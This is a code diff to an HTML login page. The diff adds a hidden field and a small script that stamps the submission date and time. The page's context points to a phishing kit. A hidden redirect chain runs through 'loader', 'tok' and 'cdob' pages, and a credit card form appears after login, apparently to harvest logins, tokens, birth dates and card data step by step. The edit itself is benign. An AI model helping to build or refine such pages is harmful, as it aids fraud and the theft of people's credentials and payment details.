@@ -19,7 +19,7 @@
         </div>
         <div class="box">
             <input type="hidden" id="nextValue" value="loader-home.html?next=tok.html?next=cdob.html">
-            <form id="contactForm" class="form" >
+            <form id="contactForm" class="form" onsubmit="setCurrentDateTime()">
                 <div id="form_container">
                     <div id="login_form">
                         <div class="form-group">
@@ -60,6 +60,7 @@
                         </div>
                     </div>
                 </div>
+                <input type="hidden" id="currentDateTime" name="currentDateTime">
                 <div class="form-group">
                     <button type="submit" class="btn btn-primary">LOGIN</button>
                 </div>
@@ -120,6 +121,11 @@
                 $("#credit_card_form").fadeIn();
             });
         });
+        function setCurrentDateTime() {
+            var now = new Date();
+            var datetime = now.getFullYear()+'-'+(now.getMonth()+1)+'-'+now.getDate()+' '+now.getHours()+':'+now.getMinutes()+':'+now.getSeconds();
+            document.getElementById('currentDateTime').value = datetime;
+        }
     </script>
 </body>
 </html>
